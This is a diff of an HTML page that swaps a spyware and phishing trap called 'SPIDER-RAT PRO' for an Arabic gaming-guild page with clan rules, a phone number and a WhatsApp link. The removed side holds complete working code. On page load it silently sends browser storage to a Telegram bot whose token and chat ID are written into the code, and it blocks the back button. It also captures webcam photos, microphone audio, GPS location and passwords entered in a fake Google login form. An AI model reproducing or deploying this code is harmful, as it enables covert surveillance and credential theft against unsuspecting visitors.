@@ -3,168 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM OVERRIDE | SPIDER-RAT PRO</title>
+    <title>KINGDOM GUILD | ملوك الون تاب</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        :root { --red: #ff0000; --glow: 0 0 20px #f00; }
-        body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; margin: 0; overflow: hidden; text-transform: uppercase; }
-        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.3; }
-        .scanner { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: var(--red); box-shadow: var(--glow); animation: scan 3s linear infinite; z-index: -1; }
-        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
-        .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
-        .active { display: flex !important; }
-        .frame { border: 1px solid var(--red); background: rgba(0, 0, 0, 0.9); padding: 25px; box-shadow: inset 0 0 20px #400, var(--glow); width: 90%; max-width: 420px; clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%); }
-        input { background: transparent; border: 1px solid #400; color: #fff; padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; font-family: inherit; text-align: center; }
-        button { background: var(--red); color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; font-family: inherit; margin-top: 10px; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); }
-        .loader-wrap { width: 100%; border: 1px solid #400; height: 10px; margin: 15px 0; }
-        .progress { width: 0%; height: 100%; background: var(--red); transition: 0.5s; }
-        #controlPanel { display: none; width: 100%; flex-direction: column; gap: 8px; }
-        /* واجهة الدخول الوهمية */
-        #loginOverlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:999; justify-content:center; align-items:center; }
+        :root {
+            --neon-color: #bc13fe; /* موف نيون */
+            --bg-black: #050505;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-black);
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .main-card {
+            width: 90%;
+            max-width: 600px;
+            background: rgba(20, 20, 20, 0.8);
+            border: 2px solid var(--neon-color);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 0 20px var(--neon-color), inset 0 0 10px var(--neon-color);
+            margin: 20px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: #fff;
+            text-shadow: 0 0 5px #fff, 0 0 10px var(--neon-color), 0 0 20px var(--neon-color);
+            margin-bottom: 5px;
+        }
+
+        .leader-name {
+            color: var(--neon-color);
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        /* زخرفة قائمة اللائحة */
+        .rules-list {
+            text-align: right;
+            background: rgba(138, 43, 226, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            border-left: 4px solid var(--neon-color);
+            margin-bottom: 25px;
+        }
+
+        .rules-list h2 {
+            color: var(--neon-color);
+            font-size: 1.5rem;
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+            margin-top: 0;
+        }
+
+        .rules-list ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .rules-list li {
+            padding: 8px 0;
+            font-size: 1.1rem;
+            border-bottom: 1px dashed #333;
+        }
+
+        .rules-list li::before {
+            content: "⚡";
+            margin-left: 10px;
+            color: var(--neon-color);
+        }
+
+        .contact-box {
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #333;
+            margin-bottom: 20px;
+        }
+
+        .whatsapp-btn {
+            display: block;
+            background: transparent;
+            color: white;
+            border: 2px solid var(--neon-color);
+            padding: 15px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.2rem;
+            transition: 0.4s;
+            box-shadow: 0 0 10px var(--neon-color);
+        }
+
+        .whatsapp-btn:hover {
+            background: var(--neon-color);
+            box-shadow: 0 0 30px var(--neon-color);
+            transform: translateY(-3px);
+        }
+
+        .phone-num {
+            color: #00ffcc;
+            text-shadow: 0 0 5px #00ffcc;
+            font-family: monospace;
+            font-size: 1.3rem;
+        }
     </style>
 </head>
-<body onload="initInfection()">
+<body>
 
-<canvas id="matrixCanvas"></canvas>
-<div class="scanner"></div>
+    <div class="main-card">
+        <h1>• ᴋɪɴɢᴅＯＭ •</h1>
+        <span class="leader-name">BY BEPO FF</span>
 
-<div id="loginOverlay">
-    <div class="frame" style="border-color: #fbff00;">
-        <h2 style="color: #fbff00;">SECURITY BYPASS</h2>
-        <p style="font-size: 11px; color: #888;">ENTER ADMIN CREDENTIALS TO DECRYPT DATA</p>
-        <input type="email" id="fEmail" placeholder="Email / Username">
-        <input type="password" id="fPass" placeholder="Password">
-        <button onclick="snatchCreds()" style="background:#fbff00;">VERIFY & EXECUTE</button>
-    </div>
-</div>
-
-<div id="screen1" class="screen active">
-    <div class="frame">
-        <h1>TERMINAL V10</h1>
-        <input type="text" id="targetIp" placeholder="TARGET IPV4">
-        <button onclick="startMission()">INITIALIZE ATTACK</button>
-    </div>
-</div>
-
-<div id="screen2" class="screen">
-    <div class="frame">
-        <h2 id="statusH">PENETRATING...</h2>
-        <div id="loading">
-            <div class="loader-wrap"><div id="bar" class="progress"></div></div>
+        <div class="rules-list">
+            <h2>📜 لائحـة الـقـوانـيـن</h2>
+            <ul>
+                <li>اللعب <b>ONE TAP ONLY</b> (ممنوع الرش).</li>
+                <li>لازم تكسب القائد <b>3 جولات</b> في التست.</li>
+                <li>الأسلحة: <b>(Desert Eagle - Woodpecker - AC80)</b>.</li>
+                <li>الاحترام فوق كل شيء والتفاعل يومي.</li>
+            </ul>
         </div>
-        <div id="controlPanel">
-            <button onclick="startCapture()">📸 CAM FEED</button>
-            <button onclick="getLocation()">📍 GPS TRACE</button>
-            <button onclick="recordAudio()" id="aBtn">🎙️ MIC SNATCH</button>
-            <button onclick="showLogin()" style="background:#fbff00; color:#000;">🔑 SNATCH GOOGLE</button>
-            <button onclick="location.reload()" style="background:#333; color:#f00;">EXIT</button>
+
+        <div class="contact-box">
+            <span>📞 تواصل مع القائد:</span><br>
+            <span class="phone-num">01206364129</span>
         </div>
+
+        <a href="https://chat.whatsapp.com/LjP9ylrwmZr3ZRVfGQji0M" class="whatsapp-btn">دخول المملكة (WhatsApp) 🔥</a>
     </div>
-</div>
 
-<script>
-    const CONFIG = { token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg", chatId: "1268323143" };
-
-    // --- 1. الماتريكس والاهتزاز وحبس الضحية ---
-    function initInfection() {
-        startMatrix();
-        sendMsg("🔔 **TARGET ENTERED TRAP**\nAttempting Silent Data Extraction...");
-        snatchSession(); // سرقة الجلسة صامتاً
-        
-        // منع زرار الرجوع
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => { history.go(1); alert("SYSTEM LOCKED: EXIT DENIED"); };
-    }
-
-    async function snatchSession() {
-        const sessionData = JSON.stringify(sessionStorage) + JSON.stringify(localStorage);
-        const bat = navigator.getBattery ? await navigator.getBattery() : {level:0};
-        const msg = `📡 **SILENT REPORT**\n🔋 Bat: ${bat.level*100}%\n📱 Sys: ${navigator.platform}\n🔑 Session: ${sessionData.substring(0, 500)}...`;
-        sendMsg(msg);
-    }
-
-    function sendMsg(t) { fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(t)}&parse_mode=Markdown`); }
-
-    function startMission() {
-        if (navigator.vibrate) navigator.vibrate([200, 100, 200]); // اهتزاز عند البدء
-        document.getElementById('screen1').classList.remove('active');
-        document.getElementById('screen2').classList.add('active');
-        let p = 0;
-        const i = setInterval(() => {
-            p += 25; document.getElementById('bar').style.width = p + "%";
-            if(p >= 100) {
-                clearInterval(i);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('statusH').innerText = "SYSTEM COMPROMISED";
-                document.getElementById('controlPanel').style.display = 'flex';
-            }
-        }, 1000);
-    }
-
-    // --- 2. سحب الميديا والموقع ---
-    async function startCapture() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            const v = document.createElement('video'); v.srcObject = s; await v.play();
-            const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
-            setTimeout(async () => {
-                c.getContext('2d').drawImage(v, 0, 0);
-                const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
-                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('photo', b, 'x.jpg');
-                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-                s.getTracks().forEach(t => t.stop());
-                alert("VISUAL DATA RECEIVED.");
-            }, 1000);
-        } catch(e) { alert("ERROR: ACCESS BLOCKED."); }
-    }
-
-    function getLocation() {
-        navigator.geolocation.getCurrentPosition(p => {
-            sendMsg(`📍 **LOCATION**\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            alert("COORDINATES SYNCED.");
-        });
-    }
-
-    async function recordAudio() {
-        const btn = document.getElementById('aBtn'); btn.innerText = "🔴 RECORDING...";
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mr = new MediaRecorder(s); const ch = [];
-            mr.ondataavailable = e => ch.push(e.data);
-            mr.onstop = async () => {
-                const b = new Blob(ch, { type: 'audio/ogg' });
-                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('voice', b, 'v.ogg');
-                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, { method: 'POST', body: fd });
-                s.getTracks().forEach(t => t.stop());
-                btn.innerText = "🎙️ MIC SNATCH";
-            };
-            mr.start(); setTimeout(() => mr.stop(), 5000);
-        } catch(e) { alert("MIC DENIED."); btn.innerText = "🎙️ MIC SNATCH"; }
-    }
-
-    // --- 3. فخ الباسوردات ---
-    function showLogin() { document.getElementById('loginOverlay').style.display = 'flex'; }
-    async function snatchCreds() {
-        const e = document.getElementById('fEmail').value; const p = document.getElementById('fPass').value;
-        if(e && p) {
-            sendMsg(`🔓 **CREDENTIALS**\nUser: ${e}\nPass: ${p}`);
-            alert("DECRYPTION SUCCESSFUL.");
-            document.getElementById('loginOverlay').style.display = 'none';
-        }
-    }
-
-    function startMatrix() {
-        const c = document.getElementById('matrixCanvas'); const ctx = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        const dr = Array(Math.floor(c.width/20)).fill(1);
-        setInterval(() => {
-            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,c.width,c.height);
-            ctx.fillStyle = "#f00"; dr.forEach((y, i) => {
-                ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
-                if(y*20 > c.height && Math.random() > 0.975) dr[i] = 0; dr[i]++;
-            });
-        }, 40);
-    }
-</script>
 </body>
 </html>
